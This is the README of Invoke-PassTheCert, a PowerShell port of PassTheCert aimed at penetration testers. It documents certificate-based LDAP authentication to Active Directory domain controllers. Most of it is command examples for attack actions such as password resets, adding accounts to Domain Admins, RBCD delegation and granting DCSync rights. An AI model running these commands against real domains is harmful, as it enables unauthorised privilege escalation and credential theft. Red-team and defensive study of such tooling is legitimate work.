# Invoke-PassTheCert

Invoke-PassTheCert is a pure PowerShell port of PassTheCert. The purpose of this repository is to expand the landscape of PowerShell tooling available to Penetration testers and red teamers. 

The original work by AlmondOffsec can be found here: https://github.com/AlmondOffSec/PassTheCert along with the accompanying blog post: https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

Sometimes, Domain Controllers do not support PKINIT. This can be because their certificates do not have the Smart Card Logon EKU. However, several protocols, including LDAP, support Schannel, thus authentication through TLS.

---

## Note
If the certificate is password protected you will need to provide the ```-CertificatePassword``` parameter.
The ```-Certificate``` parameter accepts either a path to a PFX file or a Base64 encoded certificate ```MIINA...```

---

## Basic Usage

```powershell
Invoke-PassTheCert -Server "dc01.domain.com" -Certificate "cert.pfx" -Whoami
```

---

## Command Reference

#### Whoami
Display the current identity authenticated via the certificate.
```powershell
Invoke-PassTheCert -Server "dc01.domain.com" -Certificate "cert.pfx" -Whoami
```

---

### Reset Password
Reset a target user's password to a random value.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -ResetPassword "CN=John Doe,CN=Users,DC=domain,DC=com"
```

---

## Add SPN
Adds an SPN (e.g., `cifs/fake.domain.com`) to a user object.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -AddSPN "CN=svc_user,CN=Users,DC=domain,DC=com"
```

---

### Remove SPN
Removes SPN from target.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -RemoveSPN "CN=svc_user,CN=Users,DC=domain,DC=com"
```

---

### Add to Group
Adds a user or computer to a specified group.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -AddToGroup "CN=John Doe,CN=Users,DC=domain,DC=com" -GroupDN "CN=Domain Admins,CN=Users,DC=domain,DC=com"
```

---

### Remove from Group
Removes a user or computer from a group.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -RemoveFromGroup "CN=John Doe,CN=Users,DC=domain,DC=com" -GroupDN "CN=Domain Admins,CN=Users,DC=domain,DC=com"
```

---

### Toggle Account Status
Enables or disables a user/computer account.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -ToggleAccountStatus "CN=svc_user,CN=Users,DC=domain,DC=com"
```

---

### Add Computer
Adds a new computer account to the domain. A random password will be generated if ```-ComputerPassword``` is omitted.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -AddComputer "NewPC01" -ComputerPassword "Summer2025!"
```

---

### Remove Computer
Removes a computer object from the domain.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -RemoveComputer "CN=NewPC01,CN=Computers,DC=domain,DC=com"
```

---

### Add RBCD (Resource-Based Constrained Delegation)
Grants RBCD rights to a specified user/computer by SID.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -AddRBCD "CN=TargetPC,CN=Computers,DC=domain,DC=com" -SID "S-1-5-21-..."
```

---

### Remove RBCD
Removes RBCD rights from a target object.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -RemoveRBCD "CN=TargetPC,CN=Computers,DC=domain,DC=com"
```

---

### Elevate
Grants a user rights to perform DCSync by modifying the domain security descriptor.
```powershell
Invoke-PassTheCert -Server "dc01" -Certificate "cert.pfx" -Elevate "CN=svc_user,CN=Users,DC=domain,DC=com"
```

## Future Addtions
- Support for Start TLS
- Shadow Credential Attacks
- LDAP interactive Shell

---
